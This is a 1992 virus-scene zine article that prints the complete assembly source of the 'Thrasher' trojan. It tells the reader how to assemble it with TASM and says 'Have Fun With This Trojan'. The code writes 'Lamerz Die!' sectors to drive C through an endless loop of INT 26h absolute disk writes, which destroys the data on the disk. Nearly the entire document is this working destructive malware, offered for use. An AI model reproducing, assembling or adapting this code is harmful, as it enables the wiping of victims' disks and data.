

ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #1 - YAM '92

Article Title: Thrasher Trojan Disassembly
Author: Natas Kaupas


;*****************************************************************************
;
; Thrasher Trojan Cheap Disassembly
; Disassembled Using Sourcer v3.32 (By Natas Kaupas)
;
; To Assemble This File Use Any Text Editor To Cut Out The Source Definition
; Section And Comments (If You Want), And Then Use TASM To Compile It...
; Have Fun With This Trojan...It Will Format And Display A Message (Try it
; yourself for more information on it...hehe)
;
;*****************************************************************************
PAGE    59,123

  
seg_a             segment byte public
          assume  cs:seg_a, ds:seg_a
  
  
          org     100h
  
thrasher  proc    far
  
start:
          jmp     short loc_1             ; (012E)
          db      90h
          db      'Thrasher v. 1.00 by '
          db      9 dup (90h)
          db       20h, 20h
data_3            db      ' Lamerz Die!'
loc_1:
          mov     di,offset data_6        ; (8096:0200=20h)
loc_2:
          mov     si,offset data_3        ; (8096:0122=20h)
loc_3:
          movsb                           ; Mov [si] to es:[di]
          cmp     si,12Eh
          je      loc_5                   ; Jump if equal
          jmp     short loc_3             ; (0134)
loc_5:
          cmp     di,4FFh
          jg      loc_6                   ; Jump if >
          jmp     short loc_2             ; (0131)
loc_6:
          nop
          mov     al,2
          mov     bx,offset data_6        ; (8096:0200=20h)
          mov     cx,10h
          mov     dx,0
loc_7:
          int     26h                     ; Absolute disk write, drive al
          inc     dx
          jmp     short loc_7             ; (0151)
          db      154 dup (90h)
          db      0B4h, 4Ch,0CDh, 21h
          db      12 dup (90h)
data_6            dw      2020h                   ; Data table (indexed access)
          db      'Lamerz Die!  Lamerz Die! Lamerz '
          db      'Die! Lamerz Die! Lamerz Die! Lam'
          db      'erz Die! Lamerz Die! Lamerz Die!'
          db      ' Lamerz Die! Lamerz Die! Lamerz '
          db      'Die! Lamerz Die! Lamerz Die! Lam'
          db      'erz Die! Lamerz Die! Lamerz Die!'
          db      ' Lamerz Die! Lamerz Die! Lamerz '
          db      'Die! Lamerz Die! Lamerz Die! L'
  
thrasher  endp
  
seg_a             ends
  
          end     start



